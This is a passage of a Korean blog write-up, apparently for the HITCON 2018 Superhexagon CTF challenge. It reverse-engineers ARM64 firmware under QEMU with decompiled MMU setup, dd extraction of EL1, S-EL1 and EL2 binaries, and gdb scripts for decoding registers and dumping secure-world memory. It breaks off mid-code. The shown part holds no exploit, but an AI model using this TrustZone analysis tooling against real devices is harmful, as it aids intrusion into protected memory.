</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0001002</span>c <span style="color:#ae81ff">65</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">94</span>    bl         FUN_000101c0                                     undefined <span style="color:#a6e22e">FUN_000101c0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00010030</span> fa  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">94</span>    bl         FUN_00010818                                     undefined <span style="color:#a6e22e">FUN_00010818</span>(undefined
</span></span></code></pre></div><p>adr로 상대 주소를 만들어낸다.
이는 EL2의 코드이다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/a4f16a9ae4af921959d47901bad9ac91.png" alt=""  />

물리메모리 맵에 따라 적재된 이후 실행되었기 때문에 이러한 주소를 가지게 된다.
여기서 EL1의 exception vector 주소는 가상 주소로 설정되어있다.</p>
<p>0xb0000에서 EL1을 확인할 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UndefinedFunction_000b0000</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  ttbr0_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb1000</span>;
</span></span><span style="display:flex;"><span>  ttbr1_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb4000</span>;
</span></span><span style="display:flex;"><span>  tcr_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6080100010</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> sctlr_el1;
</span></span><span style="display:flex;"><span>  sctlr_el1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Treating indirect jump as call */</span>
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>(code <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>LAB_ffffffffc00b8000)();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이런식으로 virtual memory system을 활성화하고 점프한다.
EL1까지 찾았으니 소거법으로 마지막 남은 0x20000은 S.EL1에 해당할 것이다.
BL1 부팅을 좀 더 확인해보면, EL3에서 eret으로 EL2로 내려가서 부팅을 마저 수행한다.
그리고 IPA 0x0부터 EL1을 마저 부팅하게 되며 이때 TEE OS를 초기화한다.</p>
<h2 id="extracting-el1-s-el1-el2-binaries">Extracting EL1, S-EL1, EL2 binaries<a hidden class="anchor" aria-hidden="true" href="#extracting-el1-s-el1-el2-binaries">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>.<span style="color:#f92672">/</span>bios.bin of<span style="color:#f92672">=</span>EL1.out bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">704</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>.<span style="color:#f92672">/</span>bios.bin of<span style="color:#f92672">=</span>SEL1.out bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">576</span>
</span></span><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>.<span style="color:#f92672">/</span>bios.bin of<span style="color:#f92672">=</span>EL2.out bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1024</span> skip<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>
</span></span></code></pre></div><p>이제 EL1을 분석할 수 있게 되었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Reset</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  ttbr0_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>  ttbr1_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4000</span>;
</span></span><span style="display:flex;"><span>  tcr_el1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6080100010</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> sctlr_el1;
</span></span><span style="display:flex;"><span>  sctlr_el1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Treating indirect jump as call */</span>
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>(code <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>LAB_ffffffffc0008000)();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>여러 시스템 레지스터를 세팅하는 것을 확인할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             QWORD_00001000                                  XREF[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">:</span>     FUN_00008434:<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">846</span>c (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_0000c140:<span style="color:#ae81ff">0000</span>c1c4 (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_0000c140:<span style="color:#ae81ff">0000</span>c1d4 (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_0000c5dc:<span style="color:#ae81ff">0000</span>c630 (<span style="color:#f92672">*</span>)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00001000</span> <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">00</span>       dq         <span style="color:#ae81ff">2003</span>h
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>
</span></span></code></pre></div><p>0x1000에는 위와 같은 값이 있다.</p>
<h2 id="tcr_elx-structure--gdbscript">TCR_ELx structure &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#tcr_elx-structure--gdbscript">#</a></h2>
<p>전에 정리했었던 arm manual에서 두 개의 VA ranges를 지원하기 위해 TTBR0, TTBR1를 이용한다고 했었다.
그리고 이 두 개의 VA ranges에 대해서 각자에 TCR의 TxSz로 범위가 지정된다고 했었다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/bb5055b4d20e580c83b83e57fbb7d002.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/cfc87d22c954e4102f1332aad0750d3d.png" alt=""  />

이를 기반으로 gdbscript로 파싱하는 스크립트를 작성해서 명령을 추가했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TCR_EL1</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(TCR_EL1, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;tcr_el1&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        arg <span style="color:#f92672">=</span> arg<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(arg) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            tcr <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> len(arg) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            tcr <span style="color:#f92672">=</span> int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#39;$TCR_EL1&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;usuage: tcr_el1 [value (optional)]&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        T0SZ <span style="color:#f92672">=</span> tcr <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b111111</span>
</span></span><span style="display:flex;"><span>        T1SZ <span style="color:#f92672">=</span> tcr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        T1SZ <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0b111111</span>
</span></span><span style="display:flex;"><span>        TG1 <span style="color:#f92672">=</span> int((tcr<span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">30</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b11</span>)
</span></span><span style="display:flex;"><span>        granule_bits <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0b01</span>: <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0b10</span>: <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0b11</span>: <span style="color:#ae81ff">16</span>}[TG1]
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;T0:&#34;</span>,hex(<span style="color:#ae81ff">0</span>),<span style="color:#e6db74">&#39;~&#39;</span>,hex(<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>T0SZ)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;T1:&#34;</span>,hex(<span style="color:#ae81ff">0x10000000000000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>T1SZ)),<span style="color:#e6db74">&#39;~&#39;</span>,hex(<span style="color:#ae81ff">0xffffffffffffffff</span>))
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;granule_bits:&#39;</span>,granule_bits)
</span></span><span style="display:flex;"><span>TCR_EL1()
</span></span></code></pre></div><p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/a7c88574f81744bc340e00c2ba22572b.png" alt=""  />

이러한 범위로 이용되는 것을 확인했다.</p>
<p>TTBR이 가리키고 있는 물리 메모리 영역을 읽어야한다.
qemu에선 gdb-stub을 제공해줘서 monitor 명령어를 이용해서 물리 메모리를 읽을 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>address<span style="color:#f92672">-</span>space: memory
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0000000000000000</span><span style="color:#f92672">-</span>ffffffffffffffff (prio <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, i<span style="color:#f92672">/</span>o): system
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000004000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000000007</span>ffffff (prio <span style="color:#ae81ff">0</span>, romd): hitcon<span style="color:#f92672">.</span>flash1
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000009000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000000009000</span>fff (prio <span style="color:#ae81ff">0</span>, i<span style="color:#f92672">/</span>o): pl011
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000040000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00000000</span>ffffffff (prio <span style="color:#ae81ff">0</span>, ram): mach<span style="color:#f92672">-</span>hitcon<span style="color:#f92672">.</span>ram
</span></span><span style="display:flex;"><span>address<span style="color:#f92672">-</span>space: I<span style="color:#f92672">/</span>O
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0000000000000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">000000000000</span>ffff (prio <span style="color:#ae81ff">0</span>, i<span style="color:#f92672">/</span>o): io
</span></span><span style="display:flex;"><span>address<span style="color:#f92672">-</span>space: cpu<span style="color:#f92672">-</span>secure<span style="color:#f92672">-</span>memory<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0000000000000000</span><span style="color:#f92672">-</span>ffffffffffffffff (prio <span style="color:#ae81ff">0</span>, i<span style="color:#f92672">/</span>o): secure<span style="color:#f92672">-</span>memory
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000000000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000000003</span>ffffff (prio <span style="color:#ae81ff">0</span>, romd): hitcon<span style="color:#f92672">.</span>flash0
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000000000000</span><span style="color:#f92672">-</span>ffffffffffffffff (prio <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, i<span style="color:#f92672">/</span>o): system
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0000000004000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000000007</span>ffffff (prio <span style="color:#ae81ff">0</span>, romd): hitcon<span style="color:#f92672">.</span>flash1
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0000000009000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000000009000</span>fff (prio <span style="color:#ae81ff">0</span>, i<span style="color:#f92672">/</span>o): pl011
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0000000040000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00000000</span>ffffffff (prio <span style="color:#ae81ff">0</span>, ram): mach<span style="color:#f92672">-</span>hitcon<span style="color:#f92672">.</span>ram
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">000000000e000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">000000000</span>effffff (prio <span style="color:#ae81ff">0</span>, ram): hitcon<span style="color:#f92672">.</span>secure<span style="color:#f92672">-</span>ram
</span></span><span style="display:flex;"><span>address<span style="color:#f92672">-</span>space: cpu<span style="color:#f92672">-</span>memory<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0000000000000000</span><span style="color:#f92672">-</span>ffffffffffffffff (prio <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, i<span style="color:#f92672">/</span>o): system
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000004000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000000007</span>ffffff (prio <span style="color:#ae81ff">0</span>, romd): hitcon<span style="color:#f92672">.</span>flash1
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000009000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0000000009000</span>fff (prio <span style="color:#ae81ff">0</span>, i<span style="color:#f92672">/</span>o): pl011
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0000000040000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00000000</span>ffffffff (prio <span style="color:#ae81ff">0</span>, ram): mach<span style="color:#f92672">-</span>hitcon<span style="color:#f92672">.</span>ram
</span></span></code></pre></div><p>그런데 메모리 region을 보면 cpu-memory-0를 제외하고는 모두 secure-memory-0의 subregion으로 존재한다.</p>
<h2 id="reading-a-secure-memory--gdbscript">Reading a secure memory &amp; gdbscript<a hidden class="anchor" aria-hidden="true" href="#reading-a-secure-memory--gdbscript">#</a></h2>
<p>각자의 EL에서 디버깅을 할텐데 해당 EL에선 더 상위 EL의 메모리를 읽기 힘들다.
gdbstub에서 xp라는 명령으로 물리메모리에 액세스가 가능해서 편하게 물리메모리 영역을 덤프할 수 있다.
근데 문제는 Secure world의 메모리는 전혀 읽지 못한다는 점이다.
이는 qemu가 secure world가 메모리 격리를 고려해서 NS 비트가 세팅되지 않았을때 secure world 메모리를 읽지 못하도록 구현한 것으로 보인다.
전체 Secure/Non-secure world의 모든 물리 메모리를 접근하고 덤프하는 툴이 있으면 분석하기 편할 것 같아서 만들기로 결정했다.</p>
<p>다른 오픈소스 프로젝트들을 참고해서 arm64의 secure memory에 대한 물리 메모리 읽기를 어떤 방식으로 구현했는지 확인했다.
이를 바탕으로 직접 gdbscript를 작성해서 물리 메모리를 확인할 수 있는 명령어 지원을 추가했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> psutil
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CPSR</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(CPSR, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;cpsr&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        cpsr <span style="color:#f92672">=</span> (int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#34;$cpsr&#34;</span>)))
</span></span><span style="display:flex;"><span>        mode <span style="color:#f92672">=</span> cpsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        is_thumb <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        IRQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        FIQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        cond <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">27</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL0t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1h&#39;</span> <span style="color:#75715e"># SP_EL1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2h&#39;</span> <span style="color:#75715e"># SP_EL2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3h&#39;</span> <span style="color:#75715e"># SP_EL3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;| &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> IRQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> FIQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_thumb:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;THUMB_MODE | &#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;COND_</span><span style="color:#e6db74">{</span>hex(cond)[<span style="color:#ae81ff">2</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        print(re)
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TCR_EL1</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(TCR_EL1, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;tcr_el1&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        arg <span style="color:#f92672">=</span> arg<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(arg) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            tcr <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> len(arg) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            tcr <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#39;$TCR_EL1&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;usuage: tcr_el1 [value (optional)]&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        T0SZ <span style="color:#f92672">=</span> tcr <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b111111</span>
</span></span><span style="display:flex;"><span>        T1SZ <span style="color:#f92672">=</span> tcr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        T1SZ <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0b111111</span>
</span></span><span style="display:flex;"><span>        T1SZ <span style="color:#f92672">=</span> int(T1SZ)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;T0:&#34;</span>,hex(<span style="color:#ae81ff">0</span>),<span style="color:#e6db74">&#39;~&#39;</span>,hex(<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>T0SZ)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;T1:&#34;</span>,hex(<span style="color:#ae81ff">0x10000000000000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>T1SZ)),<span style="color:#e6db74">&#39;~&#39;</span>,hex(<span style="color:#ae81ff">0xffffffffffffffff</span>))
</span></span><span style="display:flex;"><span>TCR_EL1()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">QEMU_SUPPORT</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    address_space <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;cpu-memory-0&#39;</span>:{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;system&#39;</span> : {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;hitcon.flash1&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x000000004000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x000000007ffffff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pl011&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000009000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000009000fff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;mach-hitcon.ram&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000040000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000ffffffff</span>},
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;cpu-secure-memory-0&#39;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;hitcon.flash0&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000000000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000003ffffff</span>},
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;system&#39;</span> : {
